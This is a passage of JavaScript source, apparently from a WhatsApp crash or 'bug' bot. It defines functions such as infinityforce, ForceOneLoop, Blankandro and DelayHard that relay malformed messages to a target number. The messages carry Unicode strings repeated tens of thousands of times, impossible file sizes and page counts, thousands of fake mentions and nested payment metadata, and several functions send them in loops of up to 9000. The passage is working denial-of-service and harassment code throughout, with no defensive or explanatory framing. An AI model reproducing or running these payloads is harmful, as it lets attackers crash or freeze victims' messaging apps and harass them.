    messageId: msg.key.id
  });
  await sock.relayMessage(
    target,
    {
      groupInviteMessage: {
        groupJid: "120363347113453659@g.us",
        inviteCode: "x",
        inviteExpiration: Date.now(),
        groupName: "؂ن؃؄ٽ؂ن؃".repeat(10000),
        caption:"ꦾ".repeat(50000),
        jpegThumbnail: Buffer.from("/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAQwAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAGQALQMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAAAgMBBAYFB//EACsQAAICAQIFAwQCAwAAAAAAAAECAAMRBCEFEhMxUQcUQQYiYXEygUKx8P/EABcBAQEBAQAAAAAAAAAAAAAAAAABAgP/xAAZEQEBAAMBAAAAAAAAAAAAAAAAEQEhQTH/2gAMAwE6De/A+AaXgmrtuspqs4ZlwFzfrqKsZY4OXccp+w5z2BGccwz482rGTp1OTqY2tzGwscKT8EH5/MoPOACeYA7g+Z0YqETPMfJjmPkyi/TaezUNVXWaFL2isGy1EALbbliML+TsPIlBjmPkzJDL/IEfuB7vEeFcR4dodFbrPboLUWxUP3MitULKywwQA6OCp/B7FWxqXLxLUXanVGqzVBbCtt/R51LE/JI7kn533nnvdY61K9jstS8tYLEhBknA8DJJ/ZMgSTjJ7bRvosa1+pzMqBtjjpgDt4xiHuZyCRXt4rUf6EqiBY1rNnITcY2QD5z4/7t2mbKLkqrtsqsWq3PTcqQr4ODg/OJVJvY7oiO7MiDCKTkKM5wPG5JkTN4hERKpERAyO8MMEjbbxMRAREQEREBERAREQEREBERARNvQ6CzWLc1dlKCpC7dSwKSNtgO5O/Yb9z2BI1JEIk7UNdj1sVLKSpKsGG3gjY/sSft39p7nmq6fP08dVefOM/wzzY/OMfGcyqxpdPdq9TTptJTZfqLnFddVSlndicBVA3JJOABOp9RvpLjP0nxHS1cb4E/B+vWz1DqrctgDn/NSVLKCoIGDjlJA5t+d4RrdVw7i2i13DrRTrdNel1Fh5cJYrAqfu22IHfbzOs9UvUjjfqHrtG/GvYLVoA6UJoqmSsliOZ/vJYk8q9zjCjYHOVz4mq4gEjOD32MCIhVuptbUXvbYKw7nJFdaov9KoAH9CV4iIEYiIH/2Q==", 'base64')
      }
    },
    {
      participant: { jid: target },
      ephemeralExpiration: 5,
      timeStamp: Date.now()
    }
  );
  
  const msgNewsletter = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1@newsletter",
      newsletterName: "💣⃟Boom‽" + "ោ៝".repeat(20000),
      caption: "💣⃟Boom‽" + Baster + "ោ៝".repeat(20000),
      inviteExpiration: "999999999",
    },
  };

  await sock.relayMessage(target, msgNewsletter, {
    participant: { jid: target },
    messageId: null,
  });

  const msg2 = await generateWAMessageFromContent(target, msgNewsletter, {});
  await sock.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [{ tag: "to", attrs: { jid: target } }]
          }
        ]
      }
    ]
  });

  const message2 = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 9999999999,
            seconds: 9999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 9999999999,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(10000000 + Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: Buffer.from("AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==", 'base64')
          },
          interactiveMessage: {
            body: {
              text: "Hi I'm kelra!!" + "ꦾ".repeat(20000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "galaxy_custom",
                  buttonParamsJson: KuNtoL
                },
                {
                  name: "send_location",
                  buttonParamsJson: KuNtoL
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: KuNtoL
                },
                {
                  name: "review_order",
                  buttonParamsJson: KuNtoL
                },
                {
                  name: "catalog_message",
                  buttonParamsJson: KuNtoL
                }
              ]
            }
          }
        }
      }
    }
  };

  const msg1 = await generateWAMessageFromContent(target, message2.message, {
    userJid: sock.user?.id || target
  });

  await sock.relayMessage(target, msg1.message, {
    messageId: msg1.key.id
  });

  await new Promise(resolve => setTimeout(resolve, 250));
  
}

async function infinityforce(sock, target) {
   for(let i = 0; i < 9000; i++) {
        const msg = generateWAMessageFromContent(target, {
            ephemeralMessage: {
                message: {
                    imageMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'image/jpeg',
                        fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
                        fileLength: '591',
                        height: 0,
                        width: 0,
                        mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
                        fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
                        directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
                        mediaKeyTimestamp: '1721344123',
                        scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
                        scanLengths: [247, 201, 73, 63],
                        midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro='
                    },
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                        fileLength: "9e8",
                        pageCount: 1316134911,
                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                        fileName: "Tes!!" + "ꦸ".repeat(80000),
                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1743848703",
                        jpegThumbnail: null,
                        thumbnailWidth: 999999,
                        thumbnailHeight: 9998888,
                        streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
                        thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                        thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                        thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                        artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                        artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                        artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                        caption: "ꦸ".repeat(200000)
                    },
                    contactMessage: {
                        name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
                        address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
                        url: null
                    },
                    sendPaymentMessage: {
                        noteMessage: {
                            extendedTextMessage: {
                                text: "— Zephyrinē E'scanor",
                                matchedText: "https://github.com/zephyrinee",
                                description: "",
                                title: "",
                                paymentLinkMetadata: {
                                    button: { displayText: "\x30" },
                                    header: { headerType: 1 },
                                    provider: { paramsJson: "{{".repeat(7000) }
                                }
                            }
                        }
                    }
                }
            }
        }, {});
        
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, { 
            messageId: null, 
            participant: { jid: target } 
        });
    }
}

async function ForceOneLoop(sock, target) {
   for(let i = 0; i < 9000; i++) {
        const msg = generateWAMessageFromContent(target, {
            ephemeralMessage: {
                message: {
                    imageMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'image/jpeg',
                        fileSha256: 'dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=',
                        fileLength: '591',
                        height: 0,
                        width: 0,
                        mediaKey: 'LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=',
                        fileEncSha256: 'G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=',
                        directPath: '/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0',
                        mediaKeyTimestamp: '1721344123',
                        scansSidecar: 'igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==',
                        scanLengths: [247, 201, 73, 63],
                        midQualityFileSha256: 'qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro='
                    },
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "MWxzPkVoB3KD4ynbypO8M6hEhObJFj56l79VULN2Yc0=",
                        fileLength: "9e8",
                        pageCount: 1316134911,
                        mediaKey: "lKnY412LszvB4LfWfMS9QvHjkQV4H4W60YsaaYVd57c=",
                        fileName: "Tes!!" + "ꦸ".repeat(80000),
                        fileEncSha256: "aOHYt0jIEodM0VcMxGy6GwAIVu/4J231K349FykgHD4=",
                        directPath: "/v/t62.7161-24/11239763_2444985585840225_6522871357799450886_n.enc?ccb=11-4&oh=01_Q5Aa1QFfR6NCmADbYCPh_3eFOmUaGuJun6EuEl6A4EQ8r_2L8Q&oe=68243070&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1743848703",
                        jpegThumbnail: null,
                        thumbnailWidth: 999999,
                        thumbnailHeight: 9998888,
                        streamingSidecar: "APsZUnB5vlI7z28CA3sdzeI60bjyOgmmHpDojl82VkKPDp4MJmhpnFo0BR3IuFKF8ycznDUGG9bOZYJc2m2S/H7DFFT/nXYatMenUXGzLVI0HuLLZY8F1VM5nqYa6Bt6iYpfEJ461sbJ9mHLAtvG98Mg/PYnGiklM61+JUEvbHZ0XIM8Hxc4HEQjZlmTv72PoXkPGsC+w4mM8HwbZ6FD9EkKGfkihNPSoy/XwceSHzitxjT0BokkpFIADP9ojjFAA4LDeDwQprTYiLr8lgxudeTyrkUiuT05qbt0vyEdi3Z2m17g99IeNvm4OOYRuf6EQ5yU0Pve+YmWQ1OrxcrE5hqsHr6CuCsQZ23hFpklW1pZ6GaAEgYYy7l64Mk6NPkjEuezJB73vOU7UATCGxRh57idgEAwVmH2kMQJ6LcLClRbM01m8IdLD6MA3J3R8kjSrx3cDKHmyE7N3ZepxRrbfX0PrkY46CyzSOrVcZvzb/chy9kOxA6U13dTDyEp1nZ4UMTw2MV0QbMF6n94nFHNsV8kKLaDberigsDo7U1HUCclxfHBzmz3chng0bX32zTyQesZ2SORSDYHwzU1YmMbSMahiy3ciH0yQq1fELBvD5b+XkIJGkCzhxPy8+cFZV/4ATJ+wcJS3Z2v7NU2bJ3q/6yQ7EtruuuZPLTRxWB0wNcxGOJ/7+QkXM3AX+41Q4fddSFy2BWGgHq6LDhmQRX+OGWhTGLzu+mT3WL8EouxB5tmUhtD4pJw0tiJWXzuF9mVzF738yiVHCq8q5JY8EUFGmUcMHtKJHC4DQ6jrjVCe+4NbZ53vd39M792yNPGLS6qd8fmDoRH",
                        thumbnailDirectPath: "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
                        thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
                        thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
                        artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                        artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                        artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                        caption: "ꦸ".repeat(200000)
                    },
                    contactMessage: {
                        name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
                        address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
                        url: null
                    },
                    sendPaymentMessage: {
                        noteMessage: {
                            extendedTextMessage: {
                                text: "— Lolipop3Xe",
                                matchedText: "https://github.com/dirgaxnx",
                                description: "",
                                title: "",
                                paymentLinkMetadata: {
                                    button: { displayText: "\x30" },
                                    header: { headerType: 1 },
                                    provider: { paramsJson: "{{".repeat(7000) }
                                }
                            }
                        }
                    }
                }
            }
        }, {});
        
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: msg.message
            }
        }, { 
            messageId: null, 
            participant: { jid: target } 
        });
    }
}

async function Blankandro(sock, target) {
  await sock.relayMessage(
    target, 
    {
      stickerPackMessage: {
        stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
        name: "Mau ga jadi pacar ku" + "ꦽ".repeat(25000) + "ោ៝".repeat(20000),
        publisher: "𝞩-𝞓𝞬𝞶𝞮𝞰𝞰",
        stickers: [
          {
            fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "fMysGRN-U-bLFa6wosdS0eN4LJlVYfNB71VXZFcOye8=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "gd5ITLzUWJL0GL0jjNofUrmzfj4AQQBf8k3NmH1A90A=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "qDsm3SVPT6UhbCM7SCtCltGhxtSwYBH06KwxLOvKrbQ=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "gcZUk942MLBUdVKB4WmmtcjvEGLYUOdSimKsKR0wRcQ=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "1vLdkEZRMGWC827gx1qn7gXaxH+SOaSRXOXvH+BXE14=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "dnXazm0T+Ljj9K3QnPcCMvTCEjt70XgFoFLrIxFeUBY=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          },
          {
            fileName: "gjZriX-x+ufvggWQWAgxhjbyqpJuN7AIQqRl4ZxkHVU=.webp",
            isAnimated: false,
            emojis: [""],
            accessibilityLabel: "",
            isLottie: false,
            mimetype: "image/webp"
          }
        ],
        fileLength: "3662919",
        fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
        fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
        mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
        directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
        packDescription: "",
        mediaKeyTimestamp: "1747502082",
        trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
        thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
        thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
        thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
        stickerPackSize: "3680054",
        stickerPackOrigin: "USER_CREATED",
        contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 1900 }, 
               () =>`1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
            ),
          ],      
        },
      },
    }, 
    {
      participant: { jid: target },
    }
  );
}

async function DelayHard(sock, target) {
  for (let i = 0; i < 200; i++) {
    await sock.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "CsmX.zip",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: ""
              },
              hasMediaAttachment: true
            },
            body: {
              text: "-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
            },
            nativeFlowMessage: {},
            contextInfo: {
              mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
                length: 2000
              }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "CsmX.doc",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                  thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                  thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      },
    }, {
      messageId: null,
      participant: { jid: jid }
    });
  }
  await new Promise((r) => setTimeout(r, 1500));
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
              mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
              fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
              fileLength: "9999999999999",
              pageCount: 1316134911,
              mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
              fileName: "CosmoX.zip",
              fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
              directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1726867151",
              contactVcard: true,
              jpegThumbnail: ""
            },
            hasMediaAttachment: true
          },
          body: {
            text: "-\n" + 'ꦽ'.repeat(1000) + "@13135550202".repeat(15000)
          },
          nativeFlowMessage: {},
          contextInfo: {
            mentionedJid: ["13135550202@s.whatsapp.net", ...Array.from({
              length: 2000
            }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
            forwardingScore: 1,
            isForwarded: true,
            fromMe: false,
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                fileName: "CsmX.doc",
                fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1724474503",
                contactVcard: true,
